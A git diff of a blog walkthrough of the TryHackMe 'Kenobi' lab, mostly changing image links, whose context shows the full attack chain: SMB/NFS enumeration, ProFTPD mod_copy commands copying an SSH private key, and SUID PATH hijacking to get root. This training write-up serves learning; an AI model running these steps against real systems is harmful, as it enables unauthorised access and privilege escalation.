@@ -20,7 +20,7 @@ keywords: ["TryHackMe Kenobi Walkthrough", "Linux Privilege Escalation", "ProFTP
 image: /assets/images/thm/ctf/kenobi-02.png
 ---
 
-![Featured Image: Jedi Duel](/assets/images/thm/ctf/kenobi-02.png)
+![Featured Image: Jedi Duel](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-02.png)
 
 The **Kenobi** room on TryHackMe is a beginner-friendly Linux box focused on enumeration, exploiting Samba, leveraging a vulnerable ProFTPD service, and escalating privileges using SUID binaries. It’s a great room for anyone learning about Linux enumeration and privilege escalation paths.
 
@@ -43,7 +43,7 @@ Scan the target machine:
 ```bash
 sudo nmap -sC -sV -T4 10.10.223.18
 ```
-![Nmap Full Scan Output](assets/images/thm/ctf/thm-kenobi-03.png)
+![Nmap Full Scan Output](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-03.png)
 
 
 **Answer:** There were **7** open ports:
@@ -55,7 +55,7 @@ sudo nmap -sC -sV -T4 10.10.223.18
 - 445 (Samba)
 - 2049 (NFS)
 
-![Default Web Page on Port 80](assets/images/thm/ctf/thm-kenobi-03.png)
+![Default Web Page on Port 80](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-03.png)
 ---
 
 ## Task 2: Enumerate Samba for Shares
@@ -67,7 +67,7 @@ To enumerate SMB shares, I ran the following `nmap` script:
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.223.18
 ```
 
-![SMB Share Enumeration](assets/images/thm/ctf/thm-kenobi-03.png))
+![SMB Share Enumeration](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-03.png))
 
 **Answer:** 3 shares were found:
 - `IPC$`
@@ -89,7 +89,7 @@ Once connected, I listed the contents of the share:
 dir
 ```
 
-![SMB Share File Listing](assets/images/thm/ctf/thm-kenobi-04.png)
+![SMB Share File Listing](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-04.png)
 
 **Answer:** The file present on the share was `log.txt`.
 
@@ -101,7 +101,7 @@ dir
 cat log.txt
 ```
 
-![log.txt contents](assets/images/thm/ctf/thm-kenobi-05.png)
+![log.txt contents](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-05.png)
 
 This file revealed two key findings:
 1. An RSA key was generated for user `kenobi' at `/home/kenobi/.ssh/id_rsa`
@@ -120,7 +120,7 @@ We knew port **111** was open, which can indicate NFS. I ran the following:
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.223.18
 ```
 
-![NFS Mount Enumeration](assets/images/thm/ctf/thm-kenobi-06.png)
+![NFS Mount Enumeration](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-06.png)
 
 **Answer:** `/var` is mountable via NFS.
 
@@ -138,7 +138,7 @@ I used `searchsploit` to find matching exploits:
 searchsploit proftpd 1.3.5
 ```
 
-![Searchsploit Results for ProFTPD](assets/images/thm/ctf/thm-kenobi-07.png)
+![Searchsploit Results for ProFTPD](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-07.png)
 
 **Answer:** 4 exploits available for ProFTPD 1.3.5, including `mod_copy` vulnerabilities.
 
@@ -158,7 +158,7 @@ SITE CPFR /home/kenobi/.ssh/id_rsa
 SITE CPTO /var/tmp/id_rsa
 ```
 
-![ProFTPD mod_copy usage](assets/images/thm/ctf/thm-kenobi-08.png)
+![ProFTPD mod_copy usage](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-08.png)
 
 ---
 
@@ -174,7 +174,7 @@ sudo mkdir /mnt/kenobiNFS
 sudo mount 10.10.223.18:/var /mnt/kenobiNFS
 ```
 
-![Mounted NFS directory](assets/images/thm/ctf/thm-kenobi-09.png)
+![Mounted NFS directory](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-09.png)
 
 
 
@@ -186,14 +186,14 @@ ls -la /mnt/kenobiNFS/tmp
 **We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.**
 
 
-![Found id_rsa](assets/images/thm/ctf/thm-kenobi-10.png)
+![Found id_rsa](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-10.png)
 
 ```bash
 sudo cp /mnt/kenobiNFS/tmp/id_rsa .
 sudo chmod 600 id_rsa
 ```
 
-![Copied id_rsa](assets/images/thm/ctf/thm-kenobi-11.png)
+![Copied id_rsa](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-11.png)
 
 ---
 
@@ -211,7 +211,7 @@ cat /home/kenobi/user.txt
 
 This confirmed access as `kenobi`. Now we move on to privilege escalation.
 
-![SSH Login](assets/images/thm/ctf/thm-kenobi-12.png)
+![SSH Login](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-12.png)
 
 
 ---
@@ -220,7 +220,7 @@ This confirmed access as `kenobi`. Now we move on to privilege escalation.
 
 To begin privilege escalation, I searched for binaries with the **SUID** (Set User ID) bit set. The SUID permission causes executables to run with the permissions of the **file owner**, not the user who ran them. That’s a big deal when the file is owned by **root** because it means a low-privilege user might execute code with root privileges.
 
-![Find SUID files](assets/images/thm/ctf/thm-kenobi-13.png)
+![Find SUID files](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-13.png)
 
 I used the following command to list all SUID binaries on the system:
 
@@ -241,7 +241,7 @@ But one binary stood out:
 /usr/bin/menu
 ```
 
-![Find SUID files](assets/images/thm/ctf/thm-kenobi-14.png)
+![Find SUID files](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-14.png)
 
 
 This is **not** a standard utility on Linux systems, and it’s unusual for a custom binary to have SUID permissions. This made it a prime candidate for further analysis.
@@ -261,7 +261,7 @@ presents a list of system-related options.
 **A: 3**
 
 
-![Binary execution](assets/images/thm/ctf/thm-kenobi-15.png)
+![Binary execution](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-15.png)
 
 
 ### Investigating Vulnerable Behavior
@@ -271,7 +271,7 @@ To investigate the binary, I ran the `strings` command to extract readable strin
 ```bash
 strings /usr/bin/menu
 ```
-![strings](assets/images/thm/ctf/thm-kenobi-17.png)
+![strings](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-17.png)
 
 
 This output revealed several important clues. Near the bottom of the output were three recognizable commands:
@@ -298,7 +298,7 @@ export PATH=/tmp:$PATH
 /usr/bin/menu
 ```
 
-![Copy bin/sh into PATH](assets/images/thm/ctf/thm-kenobi-18.png)
+![Copy bin/sh into PATH](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-18.png)
 
 When `menu` executed `curl`, it actually invoked our shell as root.
 
@@ -323,18 +323,18 @@ cat /root/root.txt
 
 **Root Flag:** `177b3cd8562289f37382721c28381f02`
 
-![Capture the root flag](assets/images/thm/ctf/thm-kenobi-19.png)
+![Capture the root flag](https://notesbynisha.com/assets/images/thm/ctf/thm-kenobi-19.png)
 
 ---
 
 ## Lessons Learned
 
--Enumeration is everything — it led us to discover open ports, accessible shares, and service versions.
+- Enumeration is everything — it led us to discover open ports, accessible shares, and service versions.
 
--The `mod_copy` vulnerability in ProFTPD enabled file extraction and SSH access.
+- The `mod_copy` vulnerability in ProFTPD enabled file extraction and SSH access.
 
--Misconfigured SUID binaries can be devastating when they rely on PATH without hardcoded command paths.
+- Misconfigured SUID binaries can be devastating when they rely on PATH without hardcoded command paths.
 
--PATH hijacking remains a critical privilege escalation technique on Linux systems.
+- PATH hijacking remains a critical privilege escalation technique on Linux systems.
 
 This was a fantastic room to practice chaining enumeration and exploitation steps together for a full system compromise.
